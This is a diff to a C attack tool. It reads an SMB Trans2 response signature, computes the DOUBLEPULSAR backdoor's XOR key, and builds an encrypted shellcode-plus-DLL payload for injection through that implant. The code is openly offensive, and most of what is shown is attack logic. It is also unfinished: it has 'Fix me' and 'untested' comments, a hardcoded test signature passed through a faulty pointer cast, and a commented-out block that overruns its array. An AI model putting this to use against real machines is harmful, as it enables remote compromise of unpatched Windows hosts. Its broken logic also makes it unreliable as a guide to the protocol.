@@ -233,15 +233,30 @@ int main(int argc, char* argv[])
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
-	//FIX ME
-	//extract SMB Signature Key
-	unsigned int signature[8];
+	//Not Done!  Fix me!
+	//extract SMB Signature Key from the Trans2 SESSION_SETUP Response
+	unsigned int smb_signature[8];
 	//OR
 	//memcpy(signature, (unsigned int*)&recvbuff + 18, 8);
-	memcpy(signature, (unsigned int*)&recvbuff + 18, 2);
-	memcpy(signature + 2, (unsigned int*)&recvbuff + 20, 2);
-	memcpy(signature + 4, (unsigned int*)&recvbuff + 22, 2);
-	memcpy(signature + 6, (unsigned int*)&recvbuff + 24, 2);
+	memcpy(smb_signature, (unsigned int*)&recvbuff + 18, 2);
+	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 20, 2);
+	memcpy(smb_signature + 4, (unsigned int*)&recvbuff + 22, 2);
+	memcpy(smb_signature + 6, (unsigned int*)&recvbuff + 24, 2);
+	
+	/* untested 
+	unsigned int smb_signature[3];
+	memcpy(smb_signature, (unsigned int*)&recvbuff + 18, 1);
+	memcpy(smb_signature + 1, (unsigned int*)&recvbuff + 20, 1);
+	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 22, 1);
+	memcpy(smb_signature + 3, (unsigned int*)&recvbuff + 24, 1);
+	*/
+	
+	//test SMB signature
+	unsigned int signature[] = { 0x3a, 0x10, 0xe0, 0x36 };
+	//Generate the doublepulsar XOR key from the SMB trans2 response signature
+	//This XOR key will be used to encrypt the payload buffer
+	unsigned int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)signature);
+	printf("Calculated XOR KEY:  0x%x", XorKey);
 
 	BUFFER_WITH_SIZE payload;
 	LPCSTR shellcode_file;
@@ -250,11 +265,9 @@ int main(int argc, char* argv[])
 	shellcode_file = "userland_shellcode.bin";
 	dll_file = "payload.dll";
 	ordinal = 1;
+	//construct payload 
 	construct_payload(shellcode_file, dll_file, ordinal, &payload);
-
-	//Generate the doublepulsar signature to encrypt using the signature we got earlier
-	int XorKey = ComputeDOUBLEPULSARXorKey((unsigned int)signature);
-
+		
 	//Xor the data buffer with the calculated key
 	int len = 0;
 	len = sizeof(payload.lpbData);
